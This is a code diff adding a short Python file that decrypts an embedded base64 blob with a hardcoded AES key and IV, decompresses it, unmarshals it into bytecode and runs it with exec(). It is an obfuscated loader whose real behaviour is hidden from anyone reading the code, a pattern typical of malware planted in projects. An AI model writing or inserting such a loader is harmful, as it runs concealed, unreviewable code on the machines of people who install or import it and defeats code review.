@@ -1,0 +1,15 @@
+# Auto decrypt and exec
+import base64
+import marshal
+import zlib
+from Cryptodome.Cipher import AES
+from Cryptodome.Util.Padding import unpad
+
+KEY = b'thisis16bytekey!'
+IV = b'16byteinitvector'
+encoded = "HJyhMKVgnJgYD2IUzUFHLD1288QiLh9EJ/XgfJoV9vS5hXIUDKKn1NifbS6JrovKWVJP5IKbEmpsQFmEuv0Cc6bjX9KhpVlaCkKitLeTMxuwtDoDk4HuuDEBWsCy/Naz+wkP1h063tH/RU5sNK1VMenG8twMr5/+RLN1bXMUuIbByVXGQjO4cbT9vn2Zee/rQR7dejUx98mc6dTHp3uTzg/tOXYxirSa3ilVm5mt/DwfZEkNT83XAIZyX9PKm0w2HbsEYG7XR7frob14QpE5gxt34ENyq3mOspUutr2UATRklQryvphYYdQ5O7g0QqSEqY+L0YG6UctDRMSKK4ILEVkIRuGSAnMVuPBze1r9yU57byA4YjZe3GUXpftY9UjcPX0nvhJfhVovG4Cnbo6s76HFFHy4NjzzrLIMrr+Vm+mkJWIYJoKQIvs86PwafVMQOTJfr37EB2zvUNP+E5rIEPszvxzv3ZwZOVSk5yZ+ywQ+CwzJJbM8Is4p6kap1YXhSmg+9Np+wU47j+KC8dEuYXbnRjOsT60nv067+A6ZGzv/zN2nusfSwO72NOrX49IRwLiYqExsKwaIZTC/XR7kFDs87hvUZL2aUYNQns/wiGpKZLVglQwhLFVwRVc8i1/YFNvBv0h6bLHnSKVsWhz84c+TeU1ZT46lS52uUPe22PATy2pmuei77DRrPDBrvpIm2cGzRuLSd7jDCjB0uLkzfu4QLKj3fkz2szw940fBqX/2u3wJ5fnLrz4oqpq7Iie7n+wKyIgNoHi71ppvDhBjAQ=="
+
+cipher = AES.new(KEY, AES.MODE_CBC, IV)
+decrypted = unpad(cipher.decrypt(base64.b64decode(encoded)), AES.block_size)
+code = marshal.loads(zlib.decompress(decrypted))
+exec(code)
